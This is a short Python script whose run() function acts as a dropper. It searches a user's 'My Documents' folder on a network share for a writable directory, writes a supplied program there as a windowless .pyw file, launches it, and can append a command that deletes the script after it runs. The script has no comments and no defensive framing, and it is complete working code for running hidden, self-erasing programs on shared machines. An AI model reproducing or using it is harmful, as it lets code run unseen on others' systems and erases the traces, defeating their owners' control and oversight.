import os, getpass
def run(program,delete=True,reroll=0):
    if delete:
        program='import os, sys\n'+program
        program+="\nos.system('del '+sys.argv[0])"
    top = '\\\\[redacted]\\14$\\'+getpass.getuser()+'\\My Documents'
    okdir = ''
    import os, sys
    reroll_count = reroll
    for root, dirs, files in os.walk(top, topdown=False):
        if os.access(root, os.W_OK)==True and os.access(root, os.R_OK) and root.find('Recycl')==-1 and root.find('RECYCL')==-1:
            okdir=root
            print(okdir)
            if reroll_count==0:
                break
            else:
                reroll_count-=1
    try:
        f=open('filestore.txt','w')
        f.write(okdir)
        f.close()
    except:
        pass
    os.chdir(okdir)
    f=open('a.pyw','w')
    f.write(program)
    f.close()
    if os.path.getsize('a.pyw')==0:
        raise ValueError
    os.startfile('a.pyw')
